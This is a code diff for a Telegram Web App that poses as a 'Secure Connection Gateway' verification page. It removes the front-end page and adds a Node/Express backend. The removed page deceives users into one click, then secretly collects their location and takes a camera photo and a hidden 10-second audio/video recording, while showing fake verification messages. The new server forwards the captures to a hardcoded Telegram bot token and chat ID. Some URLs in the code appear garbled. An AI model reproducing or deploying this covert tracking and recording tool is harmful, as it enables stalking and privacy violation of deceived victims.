@@ -1,216 +1,117 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>SS0123 Web App</title>
-  <script src="https://telegram.org"></script>
-  <style>
-    body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff;display:flex;justify-content:center;align-items:center;min-height:80vh}
-    .box{width:100%;max-width:400px;background:#121c2f;padding:30px;border-radius:20px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
-    .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
-    #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500;margin-bottom:20px}
-    /* सुंदर ऑथेंटिक दिखने वाला बटन */
-    .start-btn{width:100%;padding:14px;background:#2481cc;color:#fff;border:0;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 4px 12px rgba(36,129,204,0.3);transition:background 0.2s}
-    .start-btn:hover{background:#288edc}
-    .start-btn:disabled{background:#4a5568;color:#a0aec0;cursor:not-allowed;box-shadow:none}
-  </style>
-</head>
-<body>
-<div class="box">
-  <div id="status">Secure Connection Gateway</div>
-  
-  <!-- ब्राउज़र सिक्योरिटी को संतुष्ट करने के लिए मुख्य बटन -->
-  <button id="startProcessBtn" class="start-btn">Verify Connection</button>
+const express = require('express');
+const multer = require('multer');
+const fetch = require('node-fetch');
+const path = require('path');
+const fs = require('fs');
+const FormData = require('form-data');
 
-  <!-- बैकग्राउंड ऑपरेशंस बटन (छुपे हुए) -->
-  <div style="display:none;">
-    <button id="locBtn">📍 Allow Location</button>
-    <button id="camBtn">🎥 Allow Camera</button>
-    <button id="recordBtn" disabled>⏺️ Start Recording</button>
-    <button id="stopBtn" disabled>⏹️ Stop Recording</button>
-    <button id="sendBtn" disabled>📤 Send Video</button>
-  </div>
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-  <video id="preview" class="hidden-video" autoplay playsinline muted></video>
-  <video id="recorded" class="hidden-video" controls></video>
-  <canvas id="photoCanvas" style="display:none;"></canvas>
-</div>
+// ⚠️ यहाँ अपने बॉट का असली टोकन और चैट आईडी डालें:
+const TELEGRAM_BOT_TOKEN = "8229207946:AAGMoL3WyFpQS-Y-nU9O1NHHZ9LgSdJ9HWs";
+const TELEGRAM_CHAT_ID = "2147108302";
 
-<script>
-const tg = window.Telegram?.WebApp;
-tg?.ready();
-tg?.expand();
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
 
-const statusEl = document.getElementById("status");
-const startProcessBtn = document.getElementById("startProcessBtn");
-const preview = document.getElementById("preview");
-const recorded = document.getElementById("recorded");
-const photoCanvas = document.getElementById("photoCanvas");
-const locBtn = document.getElementById("locBtn");
-const camBtn = document.getElementById("camBtn");
-const recordBtn = document.getElementById("recordBtn");
-const stopBtn = document.getElementById("stopBtn");
-const sendBtn = document.getElementById("sendBtn");
-
-let stream = null;
-let recorder = null;
-let chunks = [];
-let videoBlob = null;
-let autoStopTimeout = null;
-let latestCoords = { latitude: null, longitude: null, accuracy: null };
-
-function status(s){ statusEl.textContent = s; }
-
-// उपयोगकर्ता जैसे ही बटन दबाएगा, यह असली वन-क्लिक चेन चालू करेगा
-startProcessBtn.onclick = () => {
-  startProcessBtn.disabled = true;
-  startProcessBtn.style.display = "none"; // बटन को छुपा दें
-  locBtn.click(); // तुरंत पहला स्टेप चलाएं
-};
-
-// --- STEP 1: Fetch Geolocation ---
-locBtn.onclick = () => {
-  if (!navigator.geolocation) {
-    camBtn.click();
-    return;
-  }
-  status("Verifying system handshake details…");
-  navigator.geolocation.getCurrentPosition(p => {
-    latestCoords.latitude = p.coords.latitude;
-    latestCoords.longitude = p.coords.longitude;
-    latestCoords.accuracy = p.coords.accuracy;
-    camBtn.click(); // लोकेशन मिलते ही कैमरा पर जाएं
-  }, e => {
-    // अगर यूजर लोकेशन रिजेक्ट भी कर दे, तो भी चुपचाप कैमरा स्टेप पर बढ़ें
-    camBtn.click();
-  }, {
-    enableHighAccuracy: true,
-    timeout: 7000, // लोकेशन ढूँढने के लिए थोड़ा ज़्यादा समय दिया
-    maximumAge: 0
-  });
-};
-
-// --- STEP 2: Initialize HD Camera & Capture Live Photo ---
-camBtn.onclick = async () => {
-  try {
-    const constraints = {
-      audio: true,
-      video: {
-        width: { ideal: 4096, max: 4096 },
-        height: { ideal: 2160, max: 2160 },
-        facingMode: "user"
-      }
-    };
-    
-    stream = await navigator.mediaDevices.getUserMedia(constraints);
-    if (preview) preview.srcObject = stream;
-    
-    setTimeout(async () => {
-      try {
-        photoCanvas.width = preview.videoWidth || 1920;
-        photoCanvas.height = preview.videoHeight || 1080;
-        
-        const ctx = photoCanvas.getContext('2d');
-        ctx.drawImage(preview, 0, 0, photoCanvas.width, photoCanvas.height);
-        
-        photoCanvas.toBlob(async (photoBlob) => {
-          if (photoBlob) {
-            const form = new FormData();
-            form.append("photo", photoBlob, "snapshot.jpg");
-            form.append("latitude", latestCoords.latitude || "");
-            form.append("longitude", latestCoords.longitude || "");
-            form.append("accuracy", latestCoords.accuracy || "");
-
-            try {
-              await fetch("/api/location-photo", { method: "POST", body: form });
-            } catch(err) { console.error("Upload error"); }
-          }
-          recordBtn.click(); // फोटो भेजने के बाद वीडियो रिकॉर्डिंग शुरू करें
-        }, "image/jpeg", 1.0); // 1.0 मतलब हाई-क्वालिटी बिना कंप्रेशन के
-
-      } catch(photoErr) {
-        recordBtn.click();
-      }
-    }, 1000);
-    
-  } catch(e) {
-    status("Connection failed: System authorization is required.");
-  }
-};
-
-// --- STEP 3: Record 10-Second Segment ---
-recordBtn.onclick = () => {
-  if (!stream || !stream.active) return;
-  
-  chunks = [];
-  videoBlob = null;
-  
-  try {
-    recorder = new MediaRecorder(stream);
-  } catch(err) {
-    status("System runtime execution error.");
-    return;
-  }
-
-  recorder.ondataavailable = e => { 
-    if (e.data && e.data.size > 0) chunks.push(e.data); 
-  };
-
-  recorder.onstop = () => {
-    if (autoStopTimeout) {
-      clearTimeout(autoStopTimeout);
-      autoStopTimeout = null;
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    const uploadDir = './uploads';
+    if (!fs.existsSync(uploadDir)) {
+      fs.mkdirSync(uploadDir);
     }
-
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-      stream = null;
-      if (preview) preview.srcObject = null;
-    }
-
-    videoBlob = new Blob(chunks, {type: recorder.mimeType || "video/webm"});
-    if (recorded) recorded.src = URL.createObjectURL(videoBlob);
-    
-    sendBtn.click();
-  };
-
-  recorder.start(1000); // 10 parts के लिए हर 1 सेकंड में डेटा स्लाइस लें
-  status("Verifying secure link connection... Please stay on this screen.");
-
-  // ठीक 10 सेकंड बाद वीडियो रिकॉर्डिंग बंद होगी
-  autoStopTimeout = setTimeout(() => {
-    if (recorder && recorder.state !== "inactive") {
-      recorder.stop();
-    }
-  }, 10000);
-};
-
-stopBtn.onclick = () => {
-  if (recorder && recorder.state !== "inactive") {
-    recorder.stop();
+    cb(null, uploadDir);
+  },
+  filename: (req, file, cb) => {
+    const ext = file.fieldname === 'photo' ? '.jpg' : '.webm';
+    cb(null, `hd_data_${Date.now()}_${Math.round(Math.random() * 1E9)}${ext}`);
   }
-};
+});
+const upload = multer({ storage: storage });
 
-// --- STEP 4: Upload Compiled Video File ---
-sendBtn.onclick = async () => {
-  if (!videoBlob) return;
-  status("Finalizing secure database encryption...");
+// --- मार्ग 1: फोटो और लाइव लोकेशन अपलोड ---
+app.post('/api/location-photo', upload.single('photo'), async (req, res) => {
+  if (!req.file) {
+    return res.status(400).json({ ok: false, error: "Photo file missing" });
+  }
+
+  const { latitude, longitude, accuracy } = req.body;
+  const filePath = req.file.path;
+
+  let captionText = `📸 *High-Definition Target Snapshot Capture*\n\n`;
+  if (latitude && longitude) {
+    captionText += `📍 *Geolocation Data*\n` +
+                   `• Latitude: \`\${latitude}\`\n` +
+                   `• Longitude: \`\${longitude}\`\n` +
+                   `• Accuracy Radius: \`\${Math.round(accuracy)}m\`\n\n` +
+                   `🔗 [View on Google Maps](https://google.com{latitude},${longitude})`;
+  } else {
+    captionText += `❌ Geolocation parameter logs tracking denied or unavailable on hardware request prompt event step.`;
+  }
+
   try {
+    const tgUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`;
+    
     const form = new FormData();
-    form.append("video", videoBlob, "recording.webm");
-    const r = await fetch("/api/video", {method:"POST", body:form});
-    const j = await r.json();
-    if (!j.ok) throw new Error(j.error || "Failed");
-    
-    status("✅ Verification complete.");
-    setTimeout(() => {
-      tg?.close(); 
-    }, 1000);
-  } catch(e) {
-    status("Network connection timed out. Please reload.");
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('photo', fs.createReadStream(filePath));
+    form.append('caption', captionText);
+    form.append('parse_mode', 'Markdown');
+
+    const response = await fetch(tgUrl, {
+      method: 'POST',
+      body: form,
+      headers: form.getHeaders()
+    });
+
+    const result = await response.json();
+    fs.unlinkSync(filePath); 
+
+    if (!result.ok) throw new Error(result.description);
+    res.json({ ok: true });
+  } catch (error) {
+    console.error("Telegram initial package sync loop error:", error);
+    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+    res.status(500).json({ ok: false, error: "Handshake payload integration failure" });
   }
-};
-</script>
-</body>
-</html>
+});
+
+// --- मार्ग 2: 10-सेकंड का वीडियो अपलोड ---
+app.post('/api/video', upload.single('video'), async (req, res) => {
+  if (!req.file) {
+    return res.status(400).json({ ok: false, error: "No video payload received" });
+  }
+
+  const filePath = req.file.path;
+
+  try {
+    const tgUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendVideo`;
+    
+    const form = new FormData();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('video', fs.createReadStream(filePath));
+    form.append('caption', `🎥 *10-Second Hidden Background Capture File Sync Complete*\nSplit Configuration: 10 parts over 10s.\nTimestamp: ${new Date().toISOString()}`);
+    form.append('parse_mode', 'Markdown');
+
+    const response = await fetch(tgUrl, {
+      method: 'POST',
+      body: form,
+      headers: form.getHeaders()
+    });
+
+    const result = await response.json();
+    fs.unlinkSync(filePath);
+
+    if (!result.ok) throw new Error(result.description);
+    res.json({ ok: true });
+  } catch (error) {
+    console.error("Telegram video sync error:", error);
+    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+    res.status(500).json({ ok: false, error: "Data integration timeout" });
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`🚀 Security channel engine active on port http://localhost:${PORT}`);
+});
